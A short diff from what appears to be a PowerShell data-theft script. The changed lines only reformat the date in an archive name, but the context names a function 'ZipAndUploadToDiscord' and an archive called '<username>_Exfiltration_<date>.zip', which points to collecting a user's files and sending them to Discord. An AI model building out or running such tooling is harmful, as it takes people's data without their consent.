@@ -57,7 +57,7 @@ function ZipAndUploadToDiscord {
     $username = $env:username
 
     # Specify the date format for the archive name
-    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH-mm"
+    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'-mm"
 
     # Specify the destination zip file path with username and date
     $zipFileName = "${username}_Exfiltration_${dateSansHeure}.zip"
